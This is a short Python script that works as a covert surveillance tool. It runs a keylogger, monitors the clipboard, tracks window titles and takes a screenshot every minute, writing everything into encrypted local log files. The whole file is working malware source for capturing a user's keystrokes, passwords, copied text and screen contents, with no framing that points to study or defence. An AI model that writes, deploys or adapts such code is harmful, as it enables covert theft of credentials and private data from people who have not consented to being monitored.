import os, time, logging, threading, pyautogui, pyperclip, psutil
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime

# Create folders if not exist
for folder in ["encrypted_logs", "screenshots"]:
    os.makedirs(folder, exist_ok=True)

# Load or create encryption key
key_file = "secret.key"
if not os.path.exists(key_file):
    with open(key_file, "wb") as f:
        f.write(Fernet.generate_key())
with open(key_file, "rb") as f:
    cipher = Fernet(f.read())

def encrypt_and_save(data):
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    encrypted = cipher.encrypt(data.encode())
    with open(f"encrypted_logs/log_{now}.enc", "wb") as f:
        f.write(encrypted)

def screenshot_worker():
    while True:
        path = f"screenshots/{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        pyautogui.screenshot(path)
        time.sleep(60)

def clipboard_worker():
    prev = ""
    while True:
        try:
            content = pyperclip.paste()
            if content != prev:
                encrypt_and_save(f"[CLIPBOARD] {datetime.now()}: {content}")
                prev = content
        except Exception: pass
        time.sleep(5)

def window_worker():
    import win32gui
    last = ""
    while True:
        try:
            curr = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if curr != last:
                encrypt_and_save(f"[WINDOW] {datetime.now()}: {curr}")
                last = curr
        except Exception: pass
        time.sleep(3)

def keylog_worker():
    def on_press(key):
        try:
            encrypt_and_save(f"[KEY] {datetime.now()}: {key.char}")
        except:
            encrypt_and_save(f"[KEY] {datetime.now()}: {str(key)}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run all threads
threading.Thread(target=screenshot_worker, daemon=True).start()
threading.Thread(target=clipboard_worker, daemon=True).start()
threading.Thread(target=window_worker, daemon=True).start()
keylog_worker()
